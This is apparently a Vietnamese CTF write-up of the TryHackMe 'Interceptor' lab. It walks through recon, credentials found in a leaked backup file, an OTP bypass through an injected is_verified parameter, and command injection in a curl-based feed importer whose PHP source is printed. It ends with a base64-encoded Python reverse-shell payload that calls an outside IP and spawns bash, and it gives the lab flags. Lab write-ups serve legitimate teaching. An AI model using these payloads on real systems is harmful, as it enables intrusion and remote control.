---
title: Interceptor
Date: 2026-07-30
categories: [Tryhackme, THM-Medium]
tags:
  - Tryhackme
  - Medium
  - Linux
  - DogCat
  - THM-Medium
permalink: /tryhackme/medium/interceptor/
---
# Attack
## Recon

Scan `nmap`
```
nmap -p- 10.49.181.203 -vv -n -Pn
```

![Screenshot](/assets/tryhackme/Screenshot%202026-07-30%20at%2022.55.35.png)

Chúng ta có 3 port **22**, **53** và **80**.
Khi thấy port **80** thì mình vội truy cập vào web liền thì thấy chỉ có mỗi một form login và cái trang chủ → không thể làm gì ngoài việc brute user/pass trong vô vọng.

![Screenshot](/assets/tryhackme/Screenshot%202026-07-31%20at%2015.22.41.png)

Nhìn vào port **53** tôi nghĩ đến DNS suy đoán là sẽ liên quan đến subdomain. Trước tiên mình phải cấu hình DNS cho bài lab này trước đã, bằng cách là sẽ cấu hình ở file /etc/hosts.

![Screenshot](/assets/tryhackme/Screenshot%202026-07-31%20at%2015.24.37.png)

Sau khi cấu hình xong mình sẽ thử brute subdomain xem như thế nào ?

![Screenshot](/assets/tryhackme/Screenshot%202026-08-08%20at%2014.46.33.png)

⇢ Kết quả cũng không mấy khả quan.

Đối với port **22** thì theo kinh nghiệm làm lab của mình nó chỉ thường dùng để leo quyền thôi. Vì thế ở bước này ngoài việc bruteforce nó thì cũng chả để làm gì ⇢ bỏ qua luôn.

Quay lại port **80** và tiếp tục recon với việc tìm các thư mục và tệp tin trên web server thông qua công cụ `feroxbuster`. Mình đã chạy với command: 
```
feroxbuster -u http://mediahub.thm -w Documents/Wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt --insecure -x php.bak,sql,bak,js.bak,log,tar.gz,zip
```

Vô tình thấy được một file backup `login.php.bak`

![Screenshot](/assets/tryhackme/Screenshot%202026-08-05%20at%2007.31.49.png)

Down về và mở lên xem thì yeahhhhhhhh, phát hiện một ghi chú liên quan đến credential mà quản trị viên đã note lại.

![Screenshot](/assets/tryhackme/Screenshot%202026-08-08%20at%2014.49.06.png)

Từ ghi chú của quản trị viên ắt hẳn ai cũng có thể đoán được `username=admin@mediahub.thm` và `password=MediaHub2026`.
Sử dụng credential này để login thì mình đã phải dừng chân ở buớc xác thực otp (vì không thể truy cập vào email của admin để lấy otp nên mình đã nhập đại otp là 123456 để xem thử).

![Screenshot](/assets/tryhackme/Screenshot%202026-08-05%20at%2008.21.28.png)

## Bypass OTP
Tới bước này thì buộc phải lục lại các kỹ thuật bypass otp đã biết để thử nghiệm thôi.
Thấy bên trong phản hồi của gói tin xác thực otp có một cờ `is_verified` đuợc trả về. Mình đoán đây là cờ trạng thái otp trả về cho lập trình viên biết được otp đã được xác thực hay chưa ? (trong quá trình debug của họ). Nếu theo luồng suy đoán này thì ắt hẳn việc họ disable đoạn code debug ở phía server vẫn chưa được thực hiện ⇢ Dựa vào điều này mình nghĩ liền đến kỹ thuật **Response manipulation** để có thể bypass otp.

>Giải thich một xíu về **Response manipulation** là một kỹ thuật chỉnh sửa response (thường là những **flag parameter**) nhằm mục đích thay đổi logic của luồng hoạt động tiếp theo của ứng dụng.
>*Ps:* *Với **Request manupulation** thì ngược lại (chỉnh sửa **request** thay vì **response**)*

Vì vậy bây giờ mình sẽ thay đổi giá trị của biến `is_verified` thành `true` ở response để xem sao.

![Screenshot](/assets/tryhackme/Screenshot%202026-08-05%20at%2008.21.28.png)

Với cách này thì phản hồi của request tiếp theo (request `/dashboard`) trả về `302`. Hmm 🤔 có vẻ như **Response manipulation** không khả thi cho lắm. ☞ Thế thì thử với **Request manipulation** xem sao.
Ủa nhưng mà với **request** thì mình sửa được gì ta ? 🤔🤔🤔
Request thì chỉ có mỗi một tham số `otp` được gửi lên server thôi mà giá trị của tham số đó cũng không phải là dạng boolean (dạng cờ). Liệu rằng mình thêm một tham số nữa trùng tên với tham số mà response trả về `is_verified` thì thế nào nhỉ ? 🤔 ☞ ngại gì mà không thử.

![Screenshot](/assets/tryhackme/Screenshot%202026-08-08%20at%2014.51.45.png)

Yeah phản hồi thành công rồi.

![Screenshot](/assets/tryhackme/Screenshot%202026-08-08%20at%2012.05.27.png)

Request tiếp theo chúng ta cũng get được trang `dashboard` luôn.
Bên trong trang `dashboard` chúng ta có được flag đầu tiên hé hé.

>Flag 1: THM{ADMIN_ACCESS_USING_BURP}

Sau khi truy cập vào được trang `dashboard` chúng ta thấy được liền 2 chức năng **upload avatar** và **import feed**.
Theo bản năng cứ thấy upload file là bú liền 😜.
Sau khi thử 7749 lần upload cũng như bypass đủ kiểu thì vẫn chưa lên shell được. Thôi tạm để lại quay sang cái chức năng import kia xem sao.

## SSRF
Như phần hướng dẫn sử dụng chức năng thì mình hiểu là người dùng sẽ input một URL dẫn đên một file sau đó chức năng sẽ hiện thị nội dung file bên dưới. Đối với những URL mà không web server này không thấy được thì sẽ nhận được message phản hồi là `Internet not connected`.

![Screenshot](/assets/tryhackme/Screenshot%202026-08-09%20at%2011.18.04.png)

Mình thử input vào `https://google.com` thì nhận được message đúng như phần hướng dẫn trên đã nói. Ngoài ra, mình còn nhận được thêm một thông tin về lỗi time out khi server đã cố `curl` đến URL mà mình input. 

![Screenshot](/assets/tryhackme/Screenshot%202026-08-09%20at%2011.23.13.png)

👉🏽 Vậy thì nếu mình truyền vào URL của chính trang web này *mediahub.thm* và path đến một file mà mình đã biết ví dụ như file php của chức năng này `import_feed_api.php` thì thế nào nhỉ 😜

![Screenshot](/assets/tryhackme/Screenshot%202026-08-09%20at%2011.30.56.png)

Hmmm, vẫn la không connect được!!!! Thử đổi thành ip thay vì domain xem sao.

![Screenshot](/assets/tryhackme/Screenshot%202026-08-09%20at%2011.31.29.png)

Giờ thì có một lỗi khác và không hiện thị thêm thông tin nào đi kèm nữa.
Với kết quả trả về khác như này mình đoán là có một hàm filter nào đó đối với trường hợp là ip như vậy. Thử thay bằng `localhost` xem sao.

![Screenshot](/assets/tryhackme/Screenshot%202026-08-09%20at%2011.39.06.png)

Hmmm, bây giờ thì lại thêm một lỗi khác.
À há, nếu thay vì `http/https` thì mình thử truyền một protocol để đọc file vẫn được mà nhỉ kkkk. Thử file xem sao nhỉ :D

![Screenshot](/assets/tryhackme/Screenshot%202026-08-09%20at%2012.08.07.png)

Ái chà vẫn không húp được gì. Nhưng nhận biết thêm một fileter mới.

👉🏽 Vậy sau khi fuzz sương sương thì chúng ta đang có 4 loai filter:
>- **Internet not connected:** đối với những trường hợp web server không thể thây được URL đó.
>- **Private network access blocked:** những trường hợp đã được add vào blacklist (hiện tại đang là ip của web server này và ip attacker: ip vpn hoặc ip của máy machine attack)
>- **Localhost not allowed:** từ khoá *localhost* cũng được đưa vào blacklist.
>- **Only http/https allowed:** chỉ cho phép 2 protocol này.

Loay hoay một hồi vẫn không tìm ra được giải pháp phù hợp. Vì biết được chắc ăn là input của người dùng sẽ đuợc inject vào lệnh `curl` phía system thế nên mình thử mọi thứ liên quan đến lệnh này ở máy của mình xem có cách nào hay không thì phát hiện ra một command như sau có vẻ khả thi `curl http://google.com ; whoami`

![Screenshot](/assets/tryhackme/Screenshot%202026-08-09%20at%2011.59.09.png)

Thử input liền command này vào xem sao.

![Screenshot](/assets/tryhackme/Screenshot%202026-08-09%20at%2012.00.00.png)

Nhưng có vẻ không ăn rồi. À há, tuy nhiên khi nhìn vào kết quả trả về mình liền nảy ra một ý.
Vì như kết quả thì web server lại tiếp tục chạy tiếp một lệnh `curl` với lệnh `whoami` của mình đằng sau dấu `;` trên lệnh tổng mà mình đã input. Liệu rằng nếu mình thay bằng lệnh đọc file đối với protocol khác thì có ăn hay không? Để thử xem sao.

![Screenshot](/assets/tryhackme/Screenshot%202026-08-09%20at%2012.12.00.png)

Lần này lỗi báo về là không đọc được file 👉🏽 có vẻ như là sau khi inject thì command tổng phía server có gì đó không hợp lệ. Quay lại thử nghiệm trên máy của mình xem sao.

![Screenshot](/assets/tryhackme/Screenshot%202026-08-09%20at%2013.57.09.png)

Yeah có vẻ khả thi trên máy mình. Mang nó vào thực hành luôn xem sao.

![Screenshot](/assets/tryhackme/Screenshot%202026-08-09%20at%2013.58.34.png)

Yeah ngon luôn. Và đây là nội dung file `import_feed_api.php`
<details>
<summary><b>Nhấn vào đây để xem toàn bộ code</b></summary>
<pre style="background: #1e1e1e; color: #dcdcdc; padding: 12px; border-radius: 6px; overflow-x: auto; font-family: monospace; font-size: 14px; text-align: left;"><code>
<?php
include "config.php";
header("Content-Type: application/json");

function out($ok, $extra = []) {
  echo json_encode(array_merge(["ok"=>$ok], $extra));
  exit;
}

if (!isset($_SESSION["user"])) {
  out(false, ["error"=>"Not logged in"]);
}

$url = trim($_POST["url"] ?? "");
$url = preg_replace('/[;&|]/', '', $url, 1);
//echo $url;
if ($url === "") out(false, ["error"=>"URL required"]);

$parts = @parse_url($url);
if (!$parts || empty($parts["scheme"]) || empty($parts["host"])) {
  out(false, ["error"=>"Invalid URL"]);
}

$scheme = strtolower($parts["scheme"]);
if (!in_array($scheme, ["http","https"])) {
  out(false, ["error"=>"Only http/https allowed"]);
}

if (isset($parts["user"]) || isset($parts["pass"])) {
  out(false, ["error"=>"Userinfo not allowed"]);
}

$host = strtolower($parts["host"]);

if (in_array($host, ["localhost","localhost.localdomain"])) {
  out(false, ["error"=>"Localhost not allowed"]);
}

function is_private_ip($ip) {

  if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {

    $long = ip2long($ip);

    $ranges = [
      ["10.0.0.0","10.255.255.255"],
      ["127.0.0.0","127.255.255.255"],
      ["172.16.0.0","172.31.255.255"],
      ["192.168.0.0","192.168.255.255"],
      ["169.254.0.0","169.254.255.255"]
    ];

    foreach ($ranges as $r) {
      if ($long >= ip2long($r[0]) && $long <= ip2long($r[1])) {
        return true;
      }
    }
  }

  return false;
}

$ips = [];

if (filter_var($host, FILTER_VALIDATE_IP)) {
  $ips[] = $host;
}
else {

  $dns = dns_get_record($host, DNS_A);

  foreach ($dns as $d) {
    if (!empty($d["ip"])) {
      $ips[] = $d["ip"];
    }
  }
}

if (!$ips AND 1==2) {
  out(false, ["error"=>"Internet not connected"]);
}
//echo "here";
foreach ($ips as $ip) {
  if (is_private_ip($ip)) {
    out(false, ["error"=>"Private network access blocked"]);
  }
}

//
// Execute curl command like a terminal
//

//$safe_url = escapeshellarg($url);
$safe_url = $url;

$cmd = "curl -L --max-time 8 --connect-timeout 4 $safe_url 2>&1";
ob_start();

$return_code = 0;

system($cmd, $return_code);

$output = ob_get_clean();

if ($return_code !== 0) {
  out(false, [
    "error" => "Internet not connected",
    "cmd_output" => $output
  ]);
}

//
// return raw curl response
//

out(true, [
  "message" => "Feed fetched successfully",
  "cmd_output" => $output
]);
</code></pre>
</details>

## Get Shell
Đọc được file rồi thì còn chần chờ gì nữa mà không reverse shell thôi kkkk.

*Payload:* 
>http://google.com/$(python3 -c "exec(__import__('base64').b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zLHB0eQpzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxOTIuMTY4LjE1OS4xNyIsMjgwNCkpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnB0eS5zcGF3bigiL2Jpbi9iYXNoIik=').decode())")

![Screenshot](/assets/tryhackme/Screenshot%202026-08-09%20at%2014.27.48.png)

![Screenshot](/assets/tryhackme/Screenshot%202026-08-09%20at%2014.28.04.png)

![Screenshot](/assets/tryhackme/Screenshot%202026-08-09%20at%2014.30.38.png)

>Flag 2: THM{SYSTEM_PWNED_SUCCESSFULLY}

